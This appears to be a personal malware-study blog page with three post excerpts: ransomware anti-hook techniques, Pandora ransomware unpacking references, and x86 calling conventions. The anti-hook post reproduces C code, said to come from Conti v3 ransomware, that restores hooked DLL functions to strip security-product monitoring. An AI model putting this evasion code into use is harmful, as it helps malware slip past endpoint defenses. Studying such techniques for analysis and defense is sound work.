<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="scr1pt"><title>scr1pt's blog</title><meta name="description" content="my dear virus, please fuck me"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/scr1pt.jpg"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.1.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a class="current" href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li><li> <a href="/links">Links</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)" style="display:none;"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/scr1pt.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/scr1pt.jpg" style="width:200px;" alt="favicon"><h3 title=""><a href="/">scr1pt's blog</a></h3><div class="description"><p>my dear virus, please fuck me</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/scr1pt-kid"><i class="fa fa-github"></i></a></li><li><a href="mailto:2466811523@qq.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="http://sighttp.qq.com/authd?IDKEY=2466811523"><i class="fa fa-qq"></i></a></li></ul></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> scr1pt</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/18/anti-hook/">anti-hook</a></h3></div><div class="post-content"><div class="card"><p><h2 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h2><p>part of conti v3 Ransomeware, by the way, fucking the school’s midterm exam. I’m longing for the day becoming stronger in Virus Learning. </p>
<h2 id="打开系统对应的文件"><a href="#打开系统对应的文件" class="headerlink" title="打开系统对应的文件"></a>打开系统对应的文件</h2><p>导入kernel32.dll并获取文件路径,打开文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">HMODULE hKernel32 = apLoadLibraryA(_STR(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line"></span><br><span class="line">apGetModuleFileNameW(hmodule, moduleRealPath, MAX_PATH);</span><br><span class="line"></span><br><span class="line">hFile = pCreateFileW(moduleRealPath, GENERIC_READ, FILE_SHARE_READ, <span class="number">0</span>, OPEN_EXISTING,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hFile)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">DWORD Size = <span class="number">0</span>;</span><br><span class="line">    DWORD H;</span><br><span class="line">    LARGE_INTEGER LargeInt;</span><br><span class="line">    pGetFileSizeEx(hFile, &amp;LargeInt);</span><br><span class="line">    Size = LargeInt.QuadPart;</span><br><span class="line">    <span class="keyword">if</span> (!Size)</span><br><span class="line">    &#123;</span><br><span class="line">        pCloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">hFileMap = apCreateFileMappingW(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hFileMap)</span><br><span class="line">    &#123;</span><br><span class="line">        pCloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">originDll = (LPBYTE)apMapViewOfFile(hFileMap, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, Size);</span><br><span class="line">    <span class="keyword">if</span> (!originDll)</span><br><span class="line">    &#123;</span><br><span class="line">        pCloseHandle(hFileMap);</span><br><span class="line">        pCloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="获取modules-NT-Header"><a href="#获取modules-NT-Header" class="headerlink" title="获取modules NT Header"></a>获取modules NT Header</h2><blockquote>
<p>在 IMAGE_DOS_HEADER 结构体中的 e_lfanew 成员指定了 NT 头的偏移为 000000f0。这两个范围中间就是 DOS stub 的偏移区域。</p>
<p>计算NT头的指针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PNTHeader = ImageBase + dosHeader -&gt;e_Ifanew</span><br></pre></td></tr></table></figure>

<p>根据NT_headers 找到OptionalHeader</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS64</span> &#123;</span></span><br><span class="line"></span><br><span class="line">DWORD Signature;</span><br><span class="line"></span><br><span class="line">IMAGE_FILE_HEADER FileHeader;</span><br><span class="line"></span><br><span class="line">IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line"></span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line"></span><br><span class="line">DWORD Signature;</span><br><span class="line"></span><br><span class="line">IMAGE_FILE_HEADER FileHeader;</span><br><span class="line"></span><br><span class="line">IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line"></span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure>

<p>Optional Headers</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER64</span> &#123;</span></span><br><span class="line"> WORD        Magic;</span><br><span class="line"> BYTE        MajorLinkerVersion;</span><br><span class="line"> BYTE        MinorLinkerVersion;</span><br><span class="line"> DWORD       SizeOfCode;</span><br><span class="line"> DWORD       SizeOfInitializedData;</span><br><span class="line"> DWORD       SizeOfUninitializedData;</span><br><span class="line"> DWORD       AddressOfEntryPoint;</span><br><span class="line"> DWORD       BaseOfCode;</span><br><span class="line"> ULONGLONG   ImageBase;</span><br><span class="line"> DWORD       SectionAlignment;</span><br><span class="line"> DWORD       FileAlignment;</span><br><span class="line"> WORD        MajorOperatingSystemVersion;</span><br><span class="line"> WORD        MinorOperatingSystemVersion;</span><br><span class="line"> WORD        MajorImageVersion;</span><br><span class="line"> WORD        MinorImageVersion;</span><br><span class="line"> WORD        MajorSubsystemVersion;</span><br><span class="line"> WORD        MinorSubsystemVersion;</span><br><span class="line"> DWORD       Win32VersionValue;</span><br><span class="line"> DWORD       SizeOfImage;</span><br><span class="line"> DWORD       SizeOfHeaders;</span><br><span class="line"> DWORD       CheckSum;</span><br><span class="line"> WORD        Subsystem;</span><br><span class="line"> WORD        DllCharacteristics;</span><br><span class="line"> ULONGLONG   SizeOfStackReserve;</span><br><span class="line"> ULONGLONG   SizeOfStackCommit;</span><br><span class="line"> ULONGLONG   SizeOfHeapReserve;</span><br><span class="line"> ULONGLONG   SizeOfHeapCommit;</span><br><span class="line"> DWORD       LoaderFlags;</span><br><span class="line"> DWORD       NumberOfRvaAndSizes;</span><br><span class="line"> IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;</span><br></pre></td></tr></table></figure>

<p>IMAGE_DATA_DIRECTORY结构如下</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220418213329225.png" alt="image-20220418213329225"></p>
</blockquote>
<h2 id="检查文件位数，并获取IMAGE-DATA-DIRECTORY数据。"><a href="#检查文件位数，并获取IMAGE-DATA-DIRECTORY数据。" class="headerlink" title="检查文件位数，并获取IMAGE_DATA_DIRECTORY数据。"></a>检查文件位数，并获取<code>IMAGE_DATA_DIRECTORY</code>数据。</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// get the File Offset of the modules NT Header</span></span><br><span class="line">uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe32magic)</span><br><span class="line">&#123;</span><br><span class="line">    uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS32)</span><br><span class="line">        uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe64magic)</span><br><span class="line">    &#123;</span><br><span class="line">        uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS64)</span><br><span class="line">            uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        pCloseHandle(hFileMap);</span><br><span class="line">        pCloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后根据<code>uiBaseAddress</code>和<code>uiExportDir</code>获取如下数据</p>
<ul>
<li>export directory</li>
<li>name pointers</li>
<li>the array of addresses</li>
<li>the array of name ordinals</li>
<li>the number of exported functions</li>
</ul>
<blockquote>
<p>结构体<code>_IMAGE_EXPORT_DIRECTORY</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class="line"> DWORD   Characteristics;</span><br><span class="line"> DWORD   TimeDateStamp;</span><br><span class="line"> WORD    MajorVersion;</span><br><span class="line"> WORD    MinorVersion;</span><br><span class="line"> DWORD   Name;</span><br><span class="line"> DWORD   Base;</span><br><span class="line"> DWORD   NumberOfFunctions;</span><br><span class="line"> DWORD   NumberOfNames;</span><br><span class="line"> DWORD   AddressOfFunctions;     // RVA from base of image</span><br><span class="line"> DWORD   AddressOfNames;         // RVA from base of image</span><br><span class="line"> DWORD   AddressOfNameOrdinals;  // RVA from base of image</span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// get the File Offset of the export directory</span></span><br><span class="line">    uiExportDir = uiBaseAddress</span><br><span class="line">        + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the File Offset for the array of name pointers</span></span><br><span class="line">    uiNameArray = uiBaseAddress</span><br><span class="line">        + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNames, uiBaseAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the File Offset for the array of addresses</span></span><br><span class="line">    uiAddressArray = uiBaseAddress</span><br><span class="line">        + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions,</span><br><span class="line">            uiBaseAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the File Offset for the array of name ordinals</span></span><br><span class="line">    uiNameOrdinals = uiBaseAddress</span><br><span class="line">        + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNameOrdinals,</span><br><span class="line">            uiBaseAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get a counter for the number of exported functions...</span></span><br><span class="line">    dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;NumberOfNames;</span><br></pre></td></tr></table></figure>

<h2 id="获取导出函数表"><a href="#获取导出函数表" class="headerlink" title="获取导出函数表"></a>获取导出函数表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe32magic)</span><br><span class="line">    &#123;</span><br><span class="line">        uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS32)</span><br><span class="line">            uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe64magic)</span><br><span class="line">        &#123;</span><br><span class="line">            uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS64)</span><br><span class="line">                uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            pCloseHandle(hFileMap);</span><br><span class="line">            pCloseHandle(hFile);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="检查hook"><a href="#检查hook" class="headerlink" title="检查hook"></a>检查hook</h2><ul>
<li>遍历函数<ul>
<li>检查是否有转发函数（这个概念还不是很清楚），若是则跳过</li>
<li>比较当前函数和系统中函数是否相同<ul>
<li>若函数已经被hook，则利用函数的前5byte进行覆盖，即antihook</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; dwCounter--; uiNameArray += <span class="keyword">sizeof</span>(DWORD), uiNameOrdinals += <span class="keyword">sizeof</span>(WORD))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>* cpExportedFunctionName = (<span class="type">char</span>*)(uiBaseAddress</span><br><span class="line">            + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">        uiAddressArray = uiBaseAddress</span><br><span class="line">            + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions,</span><br><span class="line">                uiBaseAddress);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// use the functions name ordinal as an index into the array of name pointers</span></span><br><span class="line">    		<span class="comment">// loop the uiAddressArray with the uiNameOrdinals</span></span><br><span class="line">        uiAddressArray += (DEREF_16(uiNameOrdinals) * <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// compute the File Offset to the function code</span></span><br><span class="line">        UINT_PTR funcAddr = uiBaseAddress + Rva2Offset(DEREF_32(uiAddressArray),</span><br><span class="line">            uiBaseAddress);</span><br><span class="line"></span><br><span class="line"> 				<span class="comment">// pass the for</span></span><br><span class="line">        <span class="type">bool</span> isForwarder = isForwardedFunc((<span class="type">const</span> <span class="type">void</span>*)funcAddr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isForwarder) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">void</span>* funcHooked = apGetProcAddress(hmodule, cpExportedFunctionName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!funcHooked) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        BYTE* p = (BYTE*)funcHooked;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (p[<span class="number">0</span>] != <span class="number">0xe9</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p[<span class="number">0</span>] != <span class="number">0xff</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (p[<span class="number">1</span>] != <span class="number">0x25</span>) <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __MINGW32__</span></span><br><span class="line">        <span class="type">bool</span> funcIsHooked = (<span class="built_in">memcmp</span>((<span class="type">const</span> <span class="type">void</span>*)funcAddr, (<span class="type">const</span> <span class="type">void</span>*)funcHooked, <span class="number">2</span>) != <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="type">bool</span> funcIsHooked = m_memcmp((<span class="type">const</span> <span class="type">void</span>*)funcAddr, (<span class="type">const</span> <span class="type">void</span>*)funcHooked, <span class="number">2</span>) != <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// __MINGW32</span></span></span><br><span class="line">        <span class="keyword">if</span> (!funcIsHooked) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">        DWORD oldProtect1 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        typedef BOOL(WINAPI* VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);</span></span><br><span class="line"><span class="comment">        VirtualProtectFunc pVirtualProtect = (VirtualProtectFunc)GetProcAddress(hKernel32,</span></span><br><span class="line"><span class="comment">            _STR(&quot;VirtualProtect&quot;));</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!apVirtualProtect(funcHooked, <span class="number">64</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//memcpy((void*)funcHooked, (void*)funcAddr, 10);</span></span><br><span class="line">        CopyMemory((<span class="type">void</span>*)funcHooked, (<span class="type">void</span>*)funcAddr, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!apVirtualProtect(funcHooked, <span class="number">64</span>, oldProtect, &amp;oldProtect1))</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-18</span><i class="fa fa-tag"></i><a class="tag" href="/tags/Ransomeware/" title="Ransomeware">Ransomeware </a><span class="leancloud_visitors"></span><span>About 919 words, 3 min 3 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/13/Pandora-Ransomeware-fla-unpack/">Pandora-Ransomeware-fla-unpack</a></h3></div><div class="post-content"><div class="card"><p><h1 id="Pandora-Ransomware"><a href="#Pandora-Ransomware" class="headerlink" title="Pandora Ransomware"></a>Pandora Ransomware</h1><p>[TOC]</p>
<h2 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h2><p>First of all, I love oalabs. Below of code is copied from his research, and I get a lot from just repeat it. And maybe there are also bogus-control-flow in this sample however.</p>
<p>Sample: <code>5b56c5d86347e164c6e571c86dbf5b1535eae6b979fede6ed66b01e79ea33b7b</code></p>
<p>Unpacked sample: <code>2619862c382d3e375f13f3859c6ab44db1a4bce905b4a617df2390fbf36902e7</code> on the malshare(by the oalabs)</p>
<p><strong>References</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://synthesis.to/2021/03/03/flattening_detection.html">Control Flow Flattening</a></li>
<li><a target="_blank" rel="noopener" href="https://research.openanalysis.net/pandora/ransomware/malware/unpacking/dumpulator/emulation/2022/03/19/]https://blog.quarkslab.com/deobfuscation-recovering-an-ollvm-protected-program.html">Deobfuscation - Recovering an ollvm</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/mrexodia/dumpulator">dumpulator</a></li>
<li><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/112">Control Flow Unflattening</a></li>
<li><a target="_blank" rel="noopener" href="https://malshare.com/sample.php?action=detail&hash=5b56c5d86347e164c6e571c86dbf5b1535eae6b979fede6ed66b01e79ea33b7b">malshare</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=SulC2l1Dvbo&t=1s">oalabs</a></li>
</ul></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-13</span><i class="fa fa-tag"></i><a class="tag" href="/tags/ollvm-dumpulator-ransomeware/" title="ollvm dumpulator ransomeware">ollvm dumpulator ransomeware </a><span class="leancloud_visitors"></span><span>About 3456 words, 11 min 31 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/07/calling-convention/">calling-convention</a></h3></div><div class="post-content"><div class="card"><p><h1 id="Calling-Conventions"><a href="#Calling-Conventions" class="headerlink" title="Calling Conventions"></a>Calling Conventions</h1><p>There are different calling conventions for different operating systems <strong>or</strong> different bits of system<br><strong>or</strong> you compile with the vs (or others)</p>
<ul>
<li>Different conventions based on processor,OS,and Language Describe how are passed to functions</li>
<li>Describe how are returned from functions</li>
<li>Describe if the caller or callee <code>clean the stack</code></li>
<li>Resonsible for function and<code>prologue</code>and<code>epilogue</code></li>
</ul>
<h2 id="Windows-x86-Calling-Convention"><a href="#Windows-x86-Calling-Convention" class="headerlink" title="Windows x86 Calling Convention"></a>Windows x86 Calling Convention</h2><table>
<thead>
<tr>
<th align="left">Keyword</th>
<th align="left">Stack cleanup</th>
<th align="left">Parameter passing</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/cdecl?view=msvc-170">__cdecl</a></td>
<td align="left">Caller</td>
<td align="left">Pushes parameters on the stack, in reverse order (right to left)</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/clrcall?view=msvc-170">__clrcall</a></td>
<td align="left">n&#x2F;a</td>
<td align="left">Load parameters onto CLR expression stack in order (left to right).</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/stdcall?view=msvc-170">__stdcall</a></td>
<td align="left">Callee</td>
<td align="left">Pushes parameters on the stack, in reverse order (right to left)</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/fastcall?view=msvc-170">__fastcall</a></td>
<td align="left">Callee</td>
<td align="left">Stored in registers, then pushed on stack</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/thiscall?view=msvc-170">__thiscall</a></td>
<td align="left">Callee</td>
<td align="left">Pushed on stack; <strong><code>this</code></strong> pointer stored in ECX</td>
</tr>
<tr>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/vectorcall?view=msvc-170">__vectorcall</a></td>
<td align="left">Callee</td>
<td align="left">Stored in registers, then pushed on stack in reverse order (right to left)</td>
</tr>
</tbody></table>
<ul>
<li>All arguments are widened to 32 bits(DWORD)</li>
<li>Return value is widened to 32 bits(DWORD)</li>
<li>Return values up to 32 bits are returned to <code>eax</code> register</li>
